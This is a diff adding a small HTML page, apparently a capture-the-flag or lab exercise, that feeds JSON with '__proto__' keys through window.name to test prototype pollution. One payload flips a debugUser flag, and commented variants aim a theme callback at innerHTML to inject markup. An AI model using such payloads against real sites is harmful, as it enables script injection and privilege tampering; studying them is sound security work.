@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Document</title>
+	</head>
+	<body>
+		<script src="utils.js"></script>
+		<script src="debug.js"></script>
+		<script src="user.js"></script>
+		<script src="theme.js"></script>
+		<script>
+			var obj = JSON.parse(
+				`{"username":"zedd","img":"http://baidu.com","theme":{"cb":"set_light_theme","options":{},"choice":1}}`
+			);
+			// window.name = `{"__proto__": {},"theme": {"cb": "document.body.firstElementChild.innerHTML=window.name.toString"},"img": "/","payload": ["<h1>1</h1>"]}`;
+			window.name = `{"debugUser":"true","__proto__":["all"]}`;
+			// window.name = `{"__proto__": {},"theme": {"cb": "document.body.firstElementChild.innerHTML=window.name.toString"},"img": "/","payload": ["<h1>1</h1>"]}`;
+			// make_user_object(obj);
+
+			make_user_object(obj);
+		</script>
+	</body>
+</html>
